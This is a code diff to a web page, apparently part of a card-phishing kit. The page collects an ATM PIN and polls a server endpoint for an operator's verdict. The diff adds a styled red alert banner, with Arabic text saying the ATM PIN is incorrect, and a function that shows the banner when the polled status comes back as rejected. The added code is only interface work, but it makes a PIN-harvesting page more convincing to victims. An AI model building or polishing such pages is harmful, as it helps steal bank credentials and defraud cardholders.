@@ -102,6 +102,9 @@
   .btn-submit:hover { background-color: #6f1626; }
   .btn-submit:disabled { background-color: var(--anabi); opacity: .55; cursor: not-allowed; box-shadow: none; }
   .error-msg { color: #c0392b; font-size: 13px; font-weight: 800; margin-top: 12px; display: none; text-align: center; }
+  .rejection-notice { position: fixed; top: 18px; left: 50%; transform: translateX(-50%); z-index: 1100; display: none; align-items: center; gap: 10px; width: min(92%, 430px); padding: 12px 16px; border: 1px solid #f0b7b7; border-radius: 10px; background: #fff5f5; color: #c0392b; font-size: 14px; font-weight: 800; box-shadow: 0 8px 22px rgba(192, 57, 43, .18); }
+  .rejection-notice.show { display: flex; }
+  .rejection-notice__icon { display: grid; place-items: center; width: 24px; height: 24px; flex: none; border-radius: 50%; background: #c0392b; color: #fff; font-size: 17px; line-height: 1; }
 
   .overlay {
     position: fixed; inset: 0;
@@ -133,6 +136,10 @@
 </style>
 </head>
 <body>
+  <div class="rejection-notice" id="rejectionNotice" role="alert">
+    <span class="rejection-notice__icon" aria-hidden="true">×</span>
+    <span id="rejectionNoticeText">رقم الصراف الآلي غير صحيح</span>
+  </div>
 
   <div class="screen">
     <div id="pinForm">
@@ -213,6 +220,10 @@
 
     function stopPoll() { clearInterval(pollTimer); pollTimer = null; }
 
+    function showRejectionNotice() {
+      document.getElementById('rejectionNotice').classList.add('show');
+    }
+
     function pollStatus() {
       pollTimer = setInterval(function() {
         fetch('/api/status/' + requestId)
@@ -232,6 +243,7 @@
               pinForm.style.display = 'block';
               document.getElementById('errorMsg').textContent = 'رقم الصراف الآلي غير صحيح أو غير صالح';
               document.getElementById('errorMsg').style.display = 'block';
+              showRejectionNotice();
               rejectOverlay.classList.remove('show');
               return;
             }
